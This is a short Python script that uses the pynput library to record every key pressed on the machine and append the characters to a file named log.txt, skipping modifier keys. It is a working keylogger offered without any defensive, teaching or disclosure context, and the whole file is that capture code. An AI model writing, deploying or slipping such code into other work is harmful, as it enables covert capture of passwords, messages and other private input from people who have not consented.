from pynput.keyboard import Listener, Key


def write_to_file(key):
    latter = ""
    #latter = str(key).replace("'","")

    # Handle special keys
    if key in [Key.space, Key.enter, Key.backspace, Key.tab]:
        latter = " " if key == Key.space else '\n' if key == Key.enter else '\t' if key == Key.tab else ""
    elif hasattr(key, 'char'):
        latter = key.char

    # Handle Ctrl, Alt and Shift keys
    if hasattr(key, 'name'):
        if "ctrl" in key.name.lower() or "alt" in key.name.lower() or "shift" in key.name.lower():
            latter = ""


    with open("log.txt", 'a') as f:
        f.write(latter)



with Listener(on_press=write_to_file) as l:
    l.join()

